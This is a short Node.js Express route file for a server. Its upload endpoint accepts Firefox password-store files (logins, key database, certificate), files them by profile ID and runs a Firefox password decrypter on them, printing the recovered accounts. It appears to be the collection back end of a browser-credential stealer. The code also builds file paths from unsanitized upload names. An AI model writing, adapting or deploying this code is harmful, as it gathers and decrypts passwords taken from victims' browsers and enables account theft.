var express = require('express');
var router = express.Router();
const {spawn} = require('child_process');

var fs = require('fs');

/* GET home page. */
router.get('/', (req, res, next) => {
  res.render('index')
});

router.post('/upload', (req, res, next) => {
  if(req.files){
    let logins = req.files.logins;
    let key = req.files.key;
    let cert = req.files.cert;

    let profileId = key.name.split("|")[0];

    const profile_folder = "./profiles/";

    if (!fs.existsSync(profile_folder + profileId)){
      fs.mkdirSync(profile_folder + profileId);
    }

    key.mv(profile_folder + profileId + '/' + key.name.split("|")[1]);
    logins.mv(profile_folder + profileId + '/' + logins.name.split("|")[1]);
    cert.mv(profile_folder + profileId + '/' + cert.name.split("|")[1]);

    res.json({status: true, message: "Files Uploaded"});

    //Lets decrypt the new profile
    const decrypt = spawn('python', ['./decrypter/firefox_decrypt.py', profile_folder + profileId + '/', '-n']);
    
    decrypt.stdout.on('data', function (data) {
      const accounts = Buffer.from(data, 'utf-8').toString();

      console.log(accounts);
    });
    
  }
  else{
    res.json({status: false, message: "No File Uploaded"});
  }
});

module.exports = router;
